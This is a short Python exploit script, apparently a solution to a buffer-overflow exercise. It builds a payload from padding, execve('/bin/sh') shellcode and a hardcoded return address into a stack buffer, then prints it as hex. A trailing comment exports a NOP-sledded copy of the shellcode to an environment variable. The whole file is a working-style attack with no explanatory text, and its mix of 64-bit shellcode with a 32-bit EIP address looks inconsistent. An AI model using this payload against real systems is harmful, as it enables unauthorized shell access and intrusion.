import struct


BUFFER_START = 0xffffd670
LEN_BUFF_TO_EIP = 71
SHELLCODE = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
NULLBYTE = "\x00"*4


TOTAL_LEN = (len(SHELLCODE + NULLBYTE))
TO_POINT = BUFFER_START + (LEN_BUFF_TO_EIP - TOTAL_LEN)
TO_POINT = struct.pack("<I", TO_POINT)

PAYLOAD = "A"*(LEN_BUFF_TO_EIP - TOTAL_LEN) + SHELLCODE + NULLBYTE + TO_POINT


print("\\x".join("{:02x}".format(ord(c)) for c in PAYLOAD))

# export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05" + 20 * "\x90"')
